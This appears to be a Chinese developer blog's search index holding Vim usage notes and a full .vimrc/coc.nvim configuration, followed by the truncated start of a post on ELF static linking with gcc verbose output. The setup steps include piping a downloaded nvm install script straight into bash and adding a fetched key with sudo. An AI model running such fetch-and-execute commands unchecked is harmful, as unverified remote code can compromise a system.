<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VIM</title>
      <link href="/2023/04/30/VIM/"/>
      <url>/2023/04/30/VIM/</url>
      
        <content type="html"><![CDATA[<h1 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h1><p>用来几天vim发现自己喜欢上了vim的模式，把所有ide能用vim插件的都改用vim了 总体来说vsc体验最好 jet全家桶ideavim还可以，vs2022 vim体验并不好，可能以后换Clion了，这种东西自己舒服才是最重要的</p><h2 id="VSCODE-vim"><a href="#VSCODE-vim" class="headerlink" title="VSCODE vim"></a>VSCODE vim</h2><h3 id="nomal模式"><a href="#nomal模式" class="headerlink" title="nomal模式"></a>nomal模式</h3><p>a在光标后插入 A在行尾插入</p><p>i在光标前插入 I在行首插入</p><p>o下行插入 O上行插入</p><p>f {char}跳到下一个char位置 F{char} 上一个</p><p>; 重复上次字符查找  ,反向查找上次查找 .可以重复上一次命令</p><p>d 删除(剪切) c修改 y复制 p粘贴 u撤销 </p><p>x删除光标处，r修改光标处</p><p>&#x3D;&#x3D;自动缩进</p><p><em>“ Ctrl-u 向上移动半屏</em></p><p><em>“ Ctrl-d 向下移动半屏</em></p><p><em>“ Ctrl-b 向上移动一屏</em></p><p><em>“ Ctrl-f 向下移动一屏</em></p><p><em>“ gg 到文档开头</em></p><p><em>“ G 到文档结尾</em></p><p><em>“ H 到屏幕顶部</em></p><p><em>“ M 到屏幕中间</em></p><p><em>“ L 到屏幕底部</em></p><h4 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h4><p><img src="/2023/04/30/VIM/image-20230430152911270.png" alt="image-20230430152911270"></p><p>w 下一个单词开头</p><p>b 本单词或者上一个单词开头(back)</p><p>e 本单词或下一个单词结尾(end)</p><p>0 绝对行首 ^行首 $行尾</p><p>gg 第一行 G最后一行</p><h4 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h4><p>a是around i是inner 标识符:() &lt;&gt; {} 等</p><p>c&#x2F;d&#x2F;y iw操作一个的单词</p><p>c&#x2F;d&#x2F;y i标识符 操作被符号包裹着的单词</p><p>c&#x2F;d&#x2F;y a标示符 连同符号一起操作</p><p>对于大括号{}里的语句还可以用c&#x2F;d&#x2F;y iB或c&#x2F;d&#x2F;y aB来操作</p><p>对于小括号()里的语句可以用c&#x2F;d&#x2F;y ib或c&#x2F;d&#x2F;y ab来操作</p><p>dd yy cc操作一行 前面加数字就可以操作n行</p><p>c&#x2F;d&#x2F;y f {char}一直操作到char</p><p>c&#x2F;d&#x2F;y i或a e操作整个文件</p><p>上面的还可以自由搭配比如de什么的</p><h3 id="VISUAL模式"><a href="#VISUAL模式" class="headerlink" title="VISUAL模式"></a>VISUAL模式</h3><p>大同小异</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>gd 转到函数定义 (goto defination)</p><p>gh 查看参数提示等 (hover悬停)</p><p>ctrl+r或者:redo来撤回误撤回</p><p>:tabn或g t切换到下一个(next)标签 :tabp 或g T切换到上一个标签(prev)</p><p>把它改到了ER方便切换</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>:[<span class="string">&quot;E&quot;</span>],</span><br><span class="line">    <span class="string">&quot;after&quot;</span>:[<span class="string">&quot;g&quot;</span>,<span class="string">&quot;T&quot;</span>]</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;before&quot;</span>:[<span class="string">&quot;R&quot;</span>],</span><br><span class="line">    <span class="string">&quot;after&quot;</span>:[<span class="string">&quot;g&quot;</span>,<span class="string">&quot;t&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ctrl o回到光标的上次，ctrl + i下次光标位置、</p><p>gcc给当前行添加注释 gc3j包括当前行4行添加注释 gciB gcaB等可以自己搭配</p><table><thead><tr><th><code>y s &lt;motion&gt; &lt;desired&gt;</code></th><th>Add <code>desired</code> surround around text defined by <code>&lt;motion&gt;</code></th></tr></thead><tbody><tr><td><code>d s &lt;existing&gt;</code></td><td>Delete <code>existing</code> surround</td></tr><tr><td><code>c s &lt;existing&gt; &lt;desired&gt;</code></td><td>Change <code>existing</code> surround to <code>desired</code></td></tr></tbody></table><table><thead><tr><th><code>S &lt;desired&gt;</code></th><th>Surround when in visual modes (surrounds full selection)</th></tr></thead><tbody><tr><td></td><td>这样就可以用vaw方便的 S引号 方便的给一个单词加上引号</td></tr></tbody></table><p> 然后我把这个插件”vim.sneak”: true打开了 s<char><char>可以向前跳到char char</char></char></p><p>S<char><char>可以向后跳到char char分号跳到下一个原本的s是删除一个字符并修改我用不到，可以用r修改，单词平常都是b cw或ciw来删除并修改</char></char></p><p><a href="https://github.com/VSCodeVim/Vim">https://github.com/VSCodeVim/Vim</a> 里还有好多有用的</p><h2 id="VIM-1"><a href="#VIM-1" class="headerlink" title="VIM"></a>VIM</h2><p>~&#x2F;.vimrc</p><p><a href="https://vimawesome.com/">https://vimawesome.com/</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/autoload/plug.vim --create-dirs \</span><br><span class="line">    https:<span class="comment">//raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></span><br></pre></td></tr></table></figure><p>cocnvim <a href="https://github.com/neoclide/coc.nvim">https://github.com/neoclide/coc.nvim</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">nodejs &gt;= <span class="number">14.14</span></span><br><span class="line">curl -o- https:<span class="comment">//raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash</span></span><br><span class="line">使用的是 zsh 或 fish，需要将安装脚本中的 bash 替换为 zsh 或 fish</span><br><span class="line">nvm install <span class="number">16</span></span><br><span class="line">nvm use <span class="number">16</span></span><br></pre></td></tr></table></figure><p>各语言支持 <a href="https://github.com/neoclide/coc.nvim/wiki/Using-coc-extensions">https://github.com/neoclide/coc.nvim/wiki/Using-coc-extensions</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install clangd</span><br><span class="line">:CocInstall coc-clangd</span><br><span class="line">:CocInstall coc-pyright</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;插入模式显示绝对行号</span></span><br><span class="line"><span class="string">&quot;</span>其他模式显示相对行号</span><br><span class="line"><span class="built_in">set</span> cursorline</span><br><span class="line"><span class="built_in">set</span> number             <span class="string">&quot; Enable line numbering</span></span><br><span class="line"><span class="string">augroup numbertoggle   &quot;</span> Toggles relativenumber on and off based on mode</span><br><span class="line">    autocmd!</span><br><span class="line">    autocmd BufEnter,FocusGained,InsertLeave * <span class="built_in">set</span> relativenumber</span><br><span class="line">    autocmd BufLeave,FocusLost,InsertEnter   * <span class="built_in">set</span> norelativenumber</span><br><span class="line">augroup END</span><br><span class="line"><span class="built_in">set</span> mouse=a</span><br><span class="line"><span class="string">&quot; add tab space</span></span><br><span class="line"><span class="string">set ts=4</span></span><br><span class="line"><span class="string">set softtabstop=4</span></span><br><span class="line"><span class="string">set shiftwidth=4</span></span><br><span class="line"><span class="string">set expandtab</span></span><br><span class="line"><span class="string">set autoindent</span></span><br><span class="line"><span class="string">inoremap jk  &lt;ESC&gt;</span></span><br><span class="line"><span class="string">call plug#begin()</span></span><br><span class="line"><span class="string">&quot;</span>最近打开文件</span><br><span class="line">Plug <span class="string">&#x27;mhinz/vim-startify&#x27;</span></span><br><span class="line"><span class="string">&quot;任务栏美化</span></span><br><span class="line"><span class="string">Plug &#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line"><span class="string">&quot;</span>自动括号</span><br><span class="line">Plug <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span></span><br><span class="line"><span class="string">&quot;彩虹括号</span></span><br><span class="line"><span class="string">Plug &#x27;luochen1990/rainbow&#x27;</span></span><br><span class="line"><span class="string">let g:rainbow_active = 1</span></span><br><span class="line"><span class="string">Plug &#x27;preservim/nerdtree&#x27;</span></span><br><span class="line"><span class="string">map &lt;C-n&gt; :NERDTreeToggle&lt;CR&gt;</span></span><br><span class="line"><span class="string">&quot;</span>vim-sneak</span><br><span class="line">Plug <span class="string">&#x27;justinmk/vim-sneak&#x27;</span></span><br><span class="line">let g:sneak<span class="meta">#label = 1</span></span><br><span class="line"><span class="string">&quot;vim-surround</span></span><br><span class="line"><span class="string">Plug &#x27;tpope/vim-surround&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>vim-commentary</span><br><span class="line">Plug <span class="string">&#x27;tpope/vim-commentary&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;theme</span></span><br><span class="line"><span class="string">Plug &#x27;joshdick/onedark.vim&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;sainnhe/edge&#x27;</span></span><br><span class="line"><span class="string">Plug &#x27;rakr/vim-one&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>coc.nvim</span><br><span class="line">Plug <span class="string">&#x27;neoclide/coc.nvim&#x27;</span>, &#123;<span class="string">&#x27;branch&#x27;</span>: <span class="string">&#x27;release&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call plug<span class="meta">#end()</span></span><br><span class="line">syntax on</span><br><span class="line"><span class="string">&quot; colorscheme onedark</span></span><br><span class="line"><span class="string">&quot;</span> colorscheme edge </span><br><span class="line"><span class="string">&quot; colorscheme one</span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">set</span> background=dark <span class="string">&quot; for the dark version</span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">set</span> background=light <span class="string">&quot; for the light version</span></span><br><span class="line"><span class="string">&quot;</span> 设置两个主题</span><br><span class="line"><span class="string">&quot; 设置默认主题</span></span><br><span class="line"><span class="string">let g:current_colorscheme = &quot;</span>onedark<span class="string">&quot;</span></span><br><span class="line"><span class="string">let g:onedark_terminal_italics=1</span></span><br><span class="line"><span class="string">set background=dark</span></span><br><span class="line"><span class="string">colorscheme onedark</span></span><br><span class="line"><span class="string">&quot;</span> 切换主题函数</span><br><span class="line">function! ToggleColorscheme()</span><br><span class="line">  <span class="keyword">if</span> g:current_colorscheme == <span class="string">&quot;onedark&quot;</span></span><br><span class="line">    let g:current_colorscheme = <span class="string">&quot;one&quot;</span></span><br><span class="line">    <span class="built_in">set</span> background=light</span><br><span class="line">    let g:one_allow_italics = <span class="number">1</span> </span><br><span class="line">    colorscheme one </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    let g:current_colorscheme = <span class="string">&quot;onedark&quot;</span></span><br><span class="line">    <span class="built_in">set</span> background=dark</span><br><span class="line">    let g:onedark_terminal_italics=<span class="number">1</span></span><br><span class="line">    colorscheme onedark </span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 设置快捷键切换主题</span></span><br><span class="line"><span class="string">nnoremap &lt;C-F6&gt; :call ToggleColorscheme()&lt;CR&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="string">&quot;cocnvim配置</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>用tab和shitft tab来切换提示，回车补全</span><br><span class="line"><span class="string">&quot; Use tab for trigger completion with characters ahead and navigate</span></span><br><span class="line"><span class="string">&quot;</span> NOTE: There<span class="number">&#x27;</span>s always complete item selected by <span class="keyword">default</span>, you may want to enable</span><br><span class="line"><span class="string">&quot; no select by `&quot;</span>suggest.noselect<span class="string">&quot;: true` in your configuration file</span></span><br><span class="line"><span class="string">&quot;</span> NOTE: Use command <span class="string">&#x27;:verbose imap &lt;tab&gt;&#x27;</span> to make sure tab is not mapped by</span><br><span class="line"><span class="string">&quot; other plugin before putting this into your config</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>将选择下一个提示改为tab</span><br><span class="line"><span class="string">&quot; inoremap &lt;silent&gt;&lt;expr&gt; &lt;TAB&gt;</span></span><br><span class="line"><span class="string">&quot;</span>       \ coc<span class="meta">#pum#visible() ? coc#pum#next(1) :</span></span><br><span class="line"><span class="string">&quot;       \ CheckBackspace() ? &quot;</span>\&lt;Tab&gt;<span class="string">&quot; :</span></span><br><span class="line"><span class="string">&quot;</span>       \ coc<span class="meta">#refresh()</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;将shift tab改为上一个补全</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt;&lt;S-TAB&gt; coc#pum#visible() ? coc#pum#prev(1) : &quot;</span>\&lt;C-h&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> Make &lt;CR&gt; to accept selected completion item or notify coc.nvim to format</span><br><span class="line"><span class="string">&quot; &lt;C-g&gt;u breaks current undo, please make your own choice</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>回车补全</span><br><span class="line"><span class="string">&quot; inoremap &lt;silent&gt;&lt;expr&gt; &lt;CR&gt; coc#pum#visible() ? coc#pum#confirm()</span></span><br><span class="line"><span class="string">                              &quot;</span> \: <span class="string">&quot;\&lt;C-g&gt;u\&lt;CR&gt;\&lt;c-r&gt;=coc#on_enter()\&lt;CR&gt;&quot;</span></span><br><span class="line"><span class="string">&quot;tab补全修改为 ctrl j和ctrl k左右移动参数</span></span><br><span class="line"><span class="string"> inoremap &lt;silent&gt;&lt;expr&gt; &lt;TAb&gt; coc#pum#visible() ? coc#pum#confirm()</span></span><br><span class="line"><span class="string">                              \: &quot;</span>\&lt;C-g&gt;u\&lt;CR&gt;\&lt;c-r&gt;=coc#on_enter()\&lt;CR&gt;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function! CheckBackspace() abort</span></span><br><span class="line"><span class="string">  let col = col(&#x27;.&#x27;) - 1</span></span><br><span class="line"><span class="string">  return !col || getline(&#x27;.&#x27;)[col - 1]  =~# &#x27;\s&#x27;</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>cocnvim config</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; Having longer updatetime (default is 4000 ms = 4s) leads to noticeable</span></span><br><span class="line"><span class="string">&quot;</span> delays and poor user experience</span><br><span class="line"><span class="string">&quot; 使用提示更快</span></span><br><span class="line"><span class="string">set updatetime=200</span></span><br><span class="line"><span class="string">&quot;</span> Always show the signcolumn, otherwise it would shift the text each time</span><br><span class="line"><span class="string">&quot; diagnostics appear/become resolved</span></span><br><span class="line"><span class="string">set signcolumn=yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>ctrl o 提示补全</span><br><span class="line">inoremap &lt;silent&gt;&lt;expr&gt; &lt;c-o&gt; coc<span class="meta">#refresh()</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;用空格+和空格-查找代码报错</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; &lt;space&gt;- &lt;Plug&gt;(coc-diagnostic-prev)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; &lt;space&gt;= &lt;Plug&gt;(coc-diagnostic-next)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>转到函数声明定义引用等</span><br><span class="line"><span class="string">&quot; GoTo code navigation</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gd &lt;Plug&gt;(coc-definition)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gy &lt;Plug&gt;(coc-type-definition)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gi &lt;Plug&gt;(coc-implementation)</span></span><br><span class="line"><span class="string">nmap &lt;silent&gt; gr &lt;Plug&gt;(coc-references)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span>空格+h显示函数等的帮助文档</span><br><span class="line">nnoremap &lt;silent&gt; &lt;space&gt;h :call ShowDocumentation()&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">function! ShowDocumentation()</span><br><span class="line">  <span class="keyword">if</span> CocAction(<span class="string">&#x27;hasProvider&#x27;</span>, <span class="string">&#x27;hover&#x27;</span>)</span><br><span class="line">    call CocActionAsync(<span class="string">&#x27;doHover&#x27;</span>)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    call feedkeys(<span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;in&#x27;</span>)</span><br><span class="line">  endif</span><br><span class="line">endfunction</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;高亮光标处所有一样的词</span></span><br><span class="line"><span class="string">&quot;</span> Highlight the symbol and its references when holding the cursor</span><br><span class="line">autocmd CursorHold * silent call CocActionAsync(<span class="string">&#x27;highlight&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;重命名变量 leader默认是\ 把他改为了空格</span></span><br><span class="line"><span class="string">&quot;</span> Symbol renaming</span><br><span class="line">let mapleader=<span class="string">&quot; &quot;</span></span><br><span class="line">nmap &lt;leader&gt;rn &lt;Plug&gt;(coc-rename)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;空格f空格 格式化化代码，不过tab缩进是2 不知道怎么改 </span></span><br><span class="line"><span class="string">&quot;</span> Formatting selected code</span><br><span class="line">xmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span><br><span class="line">nmap &lt;leader&gt;f  &lt;Plug&gt;(coc-format-selected)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; Applying code actions to the selected code block</span></span><br><span class="line"><span class="string">&quot;</span> Example: `&lt;leader&gt;aap` <span class="keyword">for</span> current paragraph</span><br><span class="line">xmap &lt;leader&gt;a  &lt;Plug&gt;(coc-codeaction-selected)</span><br><span class="line">nmap &lt;leader&gt;a  &lt;Plug&gt;(coc-codeaction-selected)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;快速选中函数里的或类类的东西,a和i的区别就是选中和不选中函数或类名字</span></span><br><span class="line"><span class="string">&quot;</span> Map function and class text objects</span><br><span class="line"><span class="string">&quot; NOTE: Requires &#x27;textDocument.documentSymbol&#x27; support from the language server</span></span><br><span class="line"><span class="string">xmap if &lt;Plug&gt;(coc-funcobj-i)</span></span><br><span class="line"><span class="string">omap if &lt;Plug&gt;(coc-funcobj-i)</span></span><br><span class="line"><span class="string">xmap af &lt;Plug&gt;(coc-funcobj-a)</span></span><br><span class="line"><span class="string">omap af &lt;Plug&gt;(coc-funcobj-a)</span></span><br><span class="line"><span class="string">xmap ic &lt;Plug&gt;(coc-classobj-i)</span></span><br><span class="line"><span class="string">omap ic &lt;Plug&gt;(coc-classobj-i)</span></span><br><span class="line"><span class="string">xmap ac &lt;Plug&gt;(coc-classobj-a)</span></span><br><span class="line"><span class="string">omap ac &lt;Plug&gt;(coc-classobj-a)</span></span><br></pre></td></tr></table></figure><p>PlugInstall</p><h4 id="Ubuntu16安装cocnvim"><a href="#Ubuntu16安装cocnvim" class="headerlink" title="Ubuntu16安装cocnvim"></a>Ubuntu16安装cocnvim</h4><p>先添加源升级vim8</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:jonathonf/vim</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure><p>clangd添加源安装</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vim  /etc/apt/sources.<span class="built_in">list</span>添加下面的源</span><br><span class="line">deb http:<span class="comment">//apt.llvm.org/xenial/ llvm-toolchain-xenial main</span></span><br><span class="line">deb-src http:<span class="comment">//apt.llvm.org/xenial/ llvm-toolchain-xenial main</span></span><br><span class="line">如果签名错误 W: GPG error: https:<span class="comment">//apt.llvm.org/xenial llvm-toolchain-xenial InRelease: The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY 15CF4D18AF4F7421</span></span><br><span class="line">执行</span><br><span class="line">wget -O - https:<span class="comment">//apt.llvm.org/llvm-snapshot.gpg.key|sudo apt-key add -</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install clangd</span><br></pre></td></tr></table></figure><p>卸载</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo apt install ppa-purge &amp;&amp; sudo ppa-purge ppa:jonathonf/vim</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ELF Static link</title>
      <link href="/2023/04/28/static-link/"/>
      <url>/2023/04/28/static-link/</url>
      
        <content type="html"><![CDATA[<h1 id="ELF-Static-link"><a href="#ELF-Static-link" class="headerlink" title="ELF Static link"></a>ELF Static link</h1><p><img src="/2023/04/28/static-link/image-20230428222115232.png" alt="image-20230428222115232"></p><p>之前在elf文件解析时只是做了一下可执行文件elf从执行的视角看了如何依靠Program Header table加载到内存区执行的过程，这次补个从链接的视角看可重定位elf文件如何依靠Section Header table做静态链接成为可执行文件的</p><p>?????????????????????????????????????????丑小鸭变天鹅????????????????????????????????????</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc --version</span><br><span class="line">gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609</span><br><span class="line">Copyright (C) 2015 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><p>中间会穿插一点11.3.0版本 just a little bit</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22-wsl ~/s/nemu [SIGINT]&gt; gcc --version</span><br><span class="line">gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0</span><br><span class="line">Copyright (C) 2021 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br></pre></td></tr></table></figure><p>工具主要是GNU Binutils  <a href="https://www.gnu.org/software/binutils/">https://www.gnu.org/software/binutils/</a> </p><p>以32位程序为例</p><h2 id="编译漫谈"><a href="#编译漫谈" class="headerlink" title="编译漫谈"></a>编译漫谈</h2><p>从古老的传说hello world说起。。。。。。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚开始大部分人初学时基本上都是直接集成环境的ide一键编译运行，慢慢开始用一些编译工具，gcc,make等，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc test2.c</span><br><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; ./a.out</span><br><span class="line">hello world⏎</span><br></pre></td></tr></table></figure><p>但是gcc帮我们做的远比我们想象的多的多</p><p>gcc提供给了我们一个选项来看显示编译和链接具体过程</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">verbose</span><br><span class="line">    Enable showing the tree dump <span class="keyword">for</span> each statement.</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/l/chapter3&gt; gcc --verbose test2.c</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/lto-wrapper</span><br><span class="line">Target: x86_64-linux-gnu</span><br><span class="line">Configured with: ../src/configure -v --with-pkgversion=<span class="string">&#x27;Ubuntu 5.4.0-6ubuntu1~16.04.12&#x27;</span> --with-bugurl=file:<span class="comment">///usr/share/doc/gcc-5/README.Bugs --enable-languages=c,ada,c++,java,go,d,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-5 --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-libmpx --enable-plugin --with-system-zlib --disable-browser-plugin --enable-java-awt=gtk --enable-gtk-cairo --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-5-amd64/jre --enable-java-home --with-jvm-root-dir=/usr/lib/jvm/java-1.5.0-gcj-5-amd64 --with-jvm-jar-dir=/usr/lib/jvm-exports/java-1.5.0-gcj-5-amd64 --with-arch-directory=amd64 --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --enable-objc-gc --enable-multiarch --disable-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu</span></span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>)</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/cc1 -quiet -v -imultiarch x86_64-linux-gnu test2.c -quiet -dumpbase test2.c -mtune=generic -march=x86<span class="number">-64</span> -auxbase test2 -version -fstack-protector-strong -Wformat -Wformat-security -o /tmp/ccZSA6XB.s</span><br><span class="line">GNU C11 (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>) version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (x86_64-linux-gnu)</span><br><span class="line">        compiled by GNU C version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>, GMP version <span class="number">6.1</span><span class="number">.0</span>, MPFR version <span class="number">3.1</span><span class="number">.4</span>, MPC version <span class="number">1.0</span><span class="number">.3</span></span><br><span class="line">GGC heuristics: --param ggc-min-expand=<span class="number">100</span> --param ggc-min-heapsize=<span class="number">131072</span></span><br><span class="line">ignoring nonexistent directory <span class="string">&quot;/usr/local/include/x86_64-linux-gnu&quot;</span></span><br><span class="line">ignoring nonexistent directory <span class="string">&quot;/usr/lib/gcc/x86_64-linux-gnu/5/../../../../x86_64-linux-gnu/include&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;...&quot;</span> search starts here:</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;...&gt;</span> search starts here:</span></span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/include</span><br><span class="line"> /usr/local/include</span><br><span class="line"> /usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/include-fixed</span><br><span class="line"> /usr/include/x86_64-linux-gnu</span><br><span class="line"> /usr/include</span><br><span class="line">End of search <span class="built_in">list</span>.</span><br><span class="line">GNU C11 (Ubuntu <span class="number">5.4</span><span class="number">.0</span><span class="number">-6u</span>buntu1~<span class="number">16.04</span><span class="number">.12</span>) version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span> (x86_64-linux-gnu)</span><br><span class="line">        compiled by GNU C version <span class="number">5.4</span><span class="number">.0</span> <span class="number">20160609</span>, GMP version <span class="number">6.1</span><span class="number">.0</span>, MPFR version <span class="number">3.1</span><span class="number">.4</span>, MPC version <span class="number">1.0</span><span class="number">.3</span></span><br><span class="line">GGC heuristics: --param ggc-min-expand=<span class="number">100</span> --param ggc-min-heapsize=<span class="number">131072</span></span><br><span class="line">Compiler executable checksum: <span class="number">8087146</span>d2ee737d238113fb57fabb1f2</span><br><span class="line">COLLECT_GCC_OPTIONS=<span class="string">&#x27;-v&#x27;</span> <span class="string">&#x27;-mtune=generic&#x27;</span> <span class="string">&#x27;-march=x86-64&#x27;</span></span><br><span class="line"> as -v -<span class="number">-64</span> -o /tmp/ccyxTcBb.o /tmp/ccZSA6XB.s</span><br><span class="line">GNU assembler version <span class="number">2.26</span><span class="number">.1</span> (x86_64-linux-gnu) using BFD version (GNU Binutils <span class="keyword">for</span> Ubuntu) <span class="number">2.26</span><span class="number">.1</span></span><br><span class="line">COMPILER_PATH=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/</span><br><span class="line">LIBRARY_PATH=/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/:/usr/lib/gcc/x86_64-linux-gnu/<span class="number">5</span>/../../../x86_64-linux-gnu/:/usr/lib/gcc/x86_64-linux-gnu/<span 